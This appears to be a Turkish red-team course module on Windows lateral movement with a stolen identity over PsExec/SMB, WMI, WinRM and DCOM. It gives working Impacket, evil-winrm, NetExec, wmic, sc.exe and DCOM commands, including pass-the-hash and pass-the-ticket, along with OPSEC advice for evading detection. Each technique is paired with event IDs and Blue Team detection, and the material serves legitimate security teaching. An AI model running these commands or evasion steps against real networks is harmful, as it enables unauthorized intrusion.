## 1. Kavramsal Temel — Neden Var?

Kimlik ele geçti; şimdi o kimlikle **başka makinede kod çalıştırmak** gerekiyor. Windows, meşru uzak yönetim için birden çok protokol sunar — ve saldırgan tam da bu **meşru** kanalları kullanır:

> **Yanal hareket, yeni bir açık sömürmez; yöneticilerin her gün kullandığı uzak yönetim protokollerini (SMB servis oluşturma, WMI, WinRM) ele geçirilmiş kimlikle kullanır. Bu yüzden tespit zordur — trafik "meşru admin işi" gibi görünür. Farkı yaratan, bağlamdır: kim, nereye, ne zaman.**

Üç ana kanal vardır ve her biri **farklı iz** bırakır — operatör en az izleneni seçer:

**Analoji:** Bir binada üç farklı servis kapısı (SMB=yük asansörü, WMI=bakım tüneli, WinRM=personel girişi). Hepsi gerçek personel için var; sen çalınan kartla hangisinin en az kameralı olduğunu seçersin.

## 2. Teknik Derinlik — Üç Kanalın Mekaniği ve İzi

### 2.1 PsExec ailesi (SMB + servis)

```
   1) SMB (445) ile ADMIN$ paylaşımına bağlan
   2) Yürütülebilir/komut'u ADMIN$'a kopyala (klasik PsExec)  — smbexec kopyalamaz
   3) SCM (Service Control Manager) ile UZAK SERVİS oluştur
   4) Servisi başlat → SYSTEM olarak komut çalışır
   5) Çıktıyı named pipe (\\.\pipe\...) üzerinden geri al
```

| Araç | Binary kopyalar mı? | Yürütme | İz |
|------|---------------------|---------|-----|
| `psexec` (Sysinternals/Impacket) | Evet | Servis | **7045** (servis kuruldu), 4688 |
| `smbexec` | Hayır (cmd her komutta servis) | Servis+pipe | 7045 tekrarlı, gürültülü |
| `services`/`atexec` | Hayır | SCM / Zamanlanmış görev | 7045 / 4698 |

> **Event 7045 (yeni servis kuruldu)** klasik PsExec imzasıdır — rastgele servis adı + `%SYSTEMROOT%` yolu ([Blue 04.3](../../2-Blue_Team/Modul_04_Yanal_Hareket_Tespiti/04.3_Uzak_Yurutme_Izleri.md)). Impacket varsayılan servis adları (`BTOBTO`, `RemComSvc` vb.) da IOC'dir.

### 2.2 WMI (WMExec) — servissiz, disksiz

```
   DCOM (135) + dinamik RPC portları  →  Win32_Process.Create("cmd /c ...")
   → Yeni servis YOK, disk'e binary YOK. Yürütme wmiprvse.exe altında doğar.
   İz: 4688 parent=WmiPrvSE.exe ; Sysmon 1 ; WMI-Activity/Operational logu
```

WMI, PsExec'ten daha sessizdir (7045 yok) ama `WmiPrvSE.exe`'nin komut satırı süreçler doğurması ([Blue 04.3](../../2-Blue_Team/Modul_04_Yanal_Hareket_Tespiti/04.3_Uzak_Yurutme_Izleri.md)) izlenir.

### 2.3 WinRM / PSRemoting (WSMan)

```
   HTTP 5985 / HTTPS 5986 (WSMan)  →  wsmprovhost.exe komutu çalıştırır
   Kimlik: NTLM/Kerberos.  Yürütme: PowerShell (Script Block Logging burada kritik)
   İz: 4688 wsmprovhost.exe ; 4103/4104 (PowerShell script block) ; WinRM Operational
```

> **WinRM tuzağı:** PowerShell **Script Block Logging (4104)** açıksa, WinRM üzerinden çalıştırdığın her script bloğu (obfuscate edilmiş olsa bile de-obfuscate edilerek) loglanır. AMSI de burada devrededir → [Modül 10.4](../Modul_10_Trust_Forest_ve_Hibrit_Saldirilar/) bypass.

### 2.4 "Double hop" sorunu (WinRM/Kerberos)

WinRM ile bir makineye Kerberos'la bağlanıp oradan **ikinci** bir ağ kaynağına erişmeye çalışırsan kimlik "ikinci sıçramada" düşer:

```
   Sen ──WinRM(Kerberos)──▶ SRV05 ──?──▶ DC   ✗ (SRV05'te kimliğin delege edilemez)
   Sebep: SRV05, senin adına DC'ye bilet isteyemez (delegation yok) → "Access Denied"
   Çözümler: (a) CredSSP (-Authentication CredSSP), (b) delege edilebilir bilet
             (tgtdeleg/PtT ile SRV05'e TGT enjekte), (c) unconstrained/RBCD (Modül 06)
```

Bu, delegation saldırılarının ([Modül 06](../Modul_06_Kerberos_Delegation_Saldirilari/)) neden yanal hareketle iç içe olduğunu açıklar.

## 3. Pratik Uygulama — Çok Araçlı

### 3.1 Impacket exec ailesi (parola/hash/bilet ile)

```bash
# Parola
impacket-psexec corp.local/administrator:'Pass!'@10.10.10.42       # SYSTEM shell, gürültülü
impacket-wmiexec corp.local/administrator:'Pass!'@10.10.10.42      # servissiz, sessiz
impacket-atexec corp.local/administrator:'Pass!'@10.10.10.42 "whoami"  # zamanlanmış görev
# Hash (PtH)
impacket-wmiexec corp.local/administrator@10.10.10.42 -hashes :31d6c...089c0
# Bilet (PtT)
KRB5CCNAME=admin.ccache impacket-psexec -k -no-pass corp.local/administrator@srv05.corp.local
```

### 3.2 WinRM (evil-winrm / NetExec)

```bash
# evil-winrm — interaktif PowerShell (parola/hash/bilet)
evil-winrm -i 10.10.10.42 -u administrator -p 'Pass!'
evil-winrm -i 10.10.10.42 -u administrator -H 31d6c...089c0        # PtH
evil-winrm -i 10.10.10.42 -u administrator -r corp.local           # Kerberos

# NetExec ile tek komut (winrm protokolü)
nxc winrm 10.10.10.42 -u administrator -H <hash> -x "whoami /all"
```

### 3.3 Windows-yerleşik (LOLBin — araç yüklemeden)

```powershell
# PSRemoting (WinRM) — meşru admin aracı, EDR için düşük-iz
Enter-PSSession -ComputerName srv05 -Credential corp\administrator
Invoke-Command -ComputerName srv05 -ScriptBlock { hostname; whoami }

# WMI yerleşik
wmic /node:srv05 /user:corp\administrator process call create "cmd /c ..."
# sc.exe ile uzak servis (PsExec'in elle hâli)
sc \\srv05 create evilsvc binPath= "cmd /c ..." ; sc \\srv05 start evilsvc
```

**Örnek çıktı (wmiexec):**
```
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful!
C:\>whoami
nt authority\system      ← uzak SYSTEM (servis kurulmadan, disk'e yazmadan)
```

### 3.4 DCOM ve diğer sessiz kanallar (LOLBin)

```powershell
# DCOM (MMC20.Application / ShellWindows) — WMI'den de sessiz olabilen alternatif
$c = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","srv05"))
$c.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c whoami > c:\o.txt","7")

# SCShell (fileless, mevcut servisin binPath'ini geçici değiştirir → 7045 üretmez)
scshell.exe srv05 XblAuthManager "C:\Windows\System32\cmd.exe /c ..."  corp.local administrator
```

## 4. Bıraktığı İz ve Karşı Tespit

| Teknik | MITRE ATT&CK | Bıraktığı iz (IOC) | Karşı Blue tespiti |
|--------|--------------|--------------------|--------------------|
| PsExec (servis) | **T1021.002** (SMB/Admin Shares) + T1569.002 | **7045** yeni servis, 5145 ADMIN$/IPC$ paylaşım erişimi, 4624 Type 3 | [Blue 04.3](../../2-Blue_Team/Modul_04_Yanal_Hareket_Tespiti/04.3_Uzak_Yurutme_Izleri.md) |
| WMI yürütme | **T1047** (WMI) | 4688 parent=WmiPrvSE.exe; WMI-Activity/Operational | [Blue 04.3](../../2-Blue_Team/Modul_04_Yanal_Hareket_Tespiti/04.3_Uzak_Yurutme_Izleri.md) |
| WinRM/PSRemoting | **T1021.006** (WinRM) | 4688 wsmprovhost.exe; **4104** script block; WinRM logu | [Blue 01.3 — Sysmon/PS logging](../../2-Blue_Team/Modul_01_Gorunurluk_ve_Log_Yonetimi/01.3_Sysmon_ile_Derin_Telemetri.md) |
| Zamanlanmış görev (atexec) | T1053.005 | **4698** görev oluşturuldu | [Blue 04.3](../../2-Blue_Team/Modul_04_Yanal_Hareket_Tespiti/04.3_Uzak_Yurutme_Izleri.md) |

**OPSEC notları:**
- **Kanal seçimi = iz seçimi.** PsExec en yüksek iz (7045+5145), WMI orta (servis yok), WinRM/PSRemoting en "meşru" (ama script block logging riski). Ortamın neyi izlediğini ([02.4](../Modul_02_Ilk_Erisim_ve_Yerlesme/02.4_Ilk_Foothold_ve_Durum_Tespiti.md) durum tespiti) bilerek seç.
- **Kaynak-hedef bağlamı en güçlü IOC'dir.** Bir iş istasyonundan diğerine (WS→WS) uzak yürütme neredeyse hiç meşru değildir; sunucudan sunucuya veya jump host'tan gelen trafik daha az dikkat çeker. Tier modeline ([Blue 05.1](../../2-Blue_Team/Modul_05_Yetki_ve_ACL_Sikilastirma/05.1_Admin_Tier_Model.md)) saygı göstererek "beklenen" yönlerde hareket et.
- **Impacket varsayılan servis/pipe adlarını değiştir** (`-service-name`, `-shell-command`) — `RemComSvc`/`BTOBTO` gibi imzalar hazır tespit kuralı olarak beklenir.
- **Interaktif shell yerine tek-komut** çalıştır (`atexec ... "komut"`): kalıcı bağlantı ve pipe gürültüsü bırakma; yaptığın işi yap, çık.
- **Diske yazma.** Klasik PsExec binary kopyalar (Sysmon 11 FileCreate). `wmiexec`/`smbexec`/WinRM disksizdir → bellek-içi çalış.

## 5. Doğrulama / Lab

```bash
# 1) SRV05'te yerel admin ile üç kanalı da dene, hangi olayların düştüğünü karşılaştır:
impacket-psexec ...   # → 7045 bekle
impacket-wmiexec ...  # → 7045 YOK, WmiPrvSE child bekle
evil-winrm ...        # → wsmprovhost + 4104 bekle
# 2) Blue: Get-WinEvent ile 7045 (System) ve 4688/4104 (Security/PS) olaylarını topla
Get-WinEvent -FilterHashtable @{LogName='System';Id=7045} | Select -First 5 Message
# 3) Impacket servis adını -service-name ile değiştir → imza tespitinin sustuğunu gözle
```

Atomic Red Team: **T1021.002 / T1047 / T1021.006 / T1569.002** → Blue doğrulaması [Blue 04.3](../../2-Blue_Team/Modul_04_Yanal_Hareket_Tespiti/04.3_Uzak_Yurutme_Izleri.md).

### Gerçek-dünya kanal-seçimi zinciri

```
   Hedef: SRV05'te komut çalıştır. Durum tespiti (02.4): Sysmon + 4104 açık, EDR var.
   → PsExec (7045) ELENDİ (çok gürültülü), WinRM (4104) RİSKLİ (script block).
   → wmiexec seç: servis yok, disk yok. Tek komut çalıştır, interaktif shell açma.
   → Çıktıyı al, çık. Kalıcılık gerekiyorsa ayrı, sessiz kanal (Modül 09).
   Kanal seçimi = izlenen olayları bilerek en sessiz yolu seçmek.
```
